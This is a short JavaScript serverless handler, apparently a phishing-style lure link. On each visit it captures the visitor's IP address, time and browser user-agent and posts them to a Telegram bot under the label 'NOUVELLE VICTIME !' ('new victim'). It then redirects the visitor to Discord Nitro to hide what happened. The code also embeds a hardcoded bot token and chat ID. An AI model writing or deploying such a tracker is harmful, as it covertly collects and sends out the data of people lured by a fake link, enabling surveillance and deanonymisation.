const botToken = "8948418784:AAH9lnh7ilWHWQ8UpUWp0aexajGq6xMWEKI";
const chatId = "2103109266";

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const time = new Date().toLocaleString('fr-FR');
  const ua = req.headers['user-agent'];

  const message = `🚨 NOUVELLE VICTIME !\n\nHeure: ${time}\nIP: ${ip}\nNavigateur: ${ua}`;

  // Envoi Telegram
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ chat_id: chatId, text: message })
  });

  res.redirect('https://discord.com/nitro');
}
